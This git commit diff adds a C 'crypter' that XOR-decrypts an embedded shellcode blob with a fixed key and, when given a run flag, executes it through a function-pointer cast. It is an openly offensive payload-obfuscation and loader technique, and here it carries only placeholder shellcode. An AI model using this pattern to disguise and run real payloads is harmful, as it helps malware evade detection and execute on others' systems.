161cea997a4a4347ac9fedbba84b9efb74e82782
Marcos <marcosgabrielserrano2@gmail.com>
2020-03-08 14:46:11 -0700

    working crypter

--- crypter/src/crypter.c
+++ crypter/src/crypter.c
@@ -8,13 +8,14 @@
 #define KEY_SZ 16
 
 unsigned char shellcode[] = "\xAB\xCD";
+unsigned char encrypted_shellcode[] = "\xa8\xaa\x01\x67\xf9\xb4\xbd\xb2\x2d\x73\xa2\x13\x14\x35\x53\xb1";
 
-unsigned char key[] = "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA";
+unsigned char key_buf[] = "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA";
 
 void *pad(void *shellcode, unsigned int len, unsigned int *result_sz)
 {
 	int fd;
-	uint32_t shellcode_len = len;
+	uint16_t shellcode_len = len;
 	unsigned int pad_sz = KEY_SZ - ((sizeof(shellcode_len) + len) % KEY_SZ);
 	*result_sz = sizeof(shellcode_len) + len + pad_sz;
 	void *result = calloc(1, *result_sz);
@@ -46,7 +47,7 @@ void encryptor()
 	int i;
 	unsigned int size = 0;
 	unsigned char *padded_plaintext = pad((void *)shellcode, sizeof(shellcode) - 1, &size);
-	unsigned char *encrypted_text = xor(padded_plaintext, key, size);
+	unsigned char *encrypted_text = xor(padded_plaintext, key_buf, size);
 
 	free(padded_plaintext);
 	
@@ -58,8 +59,67 @@ void encryptor()
 	free(encrypted_text);
 }
 
-int main()
+void decryptor(int run)
 {
-	encryptor();
-	return 0;
+	int i;
+	uint16_t len;
+	unsigned char *decrypted_shellcode;
+	unsigned char *len_buf = xor(encrypted_shellcode, key_buf, sizeof(uint16_t));
+	
+	memcpy(&len, len_buf, sizeof(len));
+	free(len_buf);
+
+	decrypted_shellcode = xor(encrypted_shellcode + sizeof(uint16_t), key_buf, len);
+
+	for(i = 0; i < len; i++)
+	{
+		printf("\\x%02x", decrypted_shellcode[i]);
+	}
+	printf("\n");
+
+	if(run)
+	{
+		void (*sc)() = (void(*)())decrypted_shellcode;
+		sc();
+	}
+	free(decrypted_shellcode);
+}
+
+int main(int argc, char *argv[])
+{
+	char opt = 0;
+	int run = 0;
+
+	while((opt = getopt(argc, argv, "r")) != -1)
+	{
+		switch(opt)
+		{
+			case 'r':
+				run = 1;
+				break;
+			default:
+				printf("Invalid option\n");
+				break;
+		}
+	}
+
+	if(!argv[optind])
+	{
+		printf("Missing argument!\n");
+		_exit(1);
+	}
+
+	if(strcmp(argv[optind], "encrypt") == 0)
+	{
+		encryptor();
+		_exit(0);
+	}
+	if(strcmp(argv[optind], "decrypt") == 0)
+	{
+		decryptor(run);
+		_exit(0);
+	}
+
+	printf("Invalid argument\n");
+	return 1;
 }
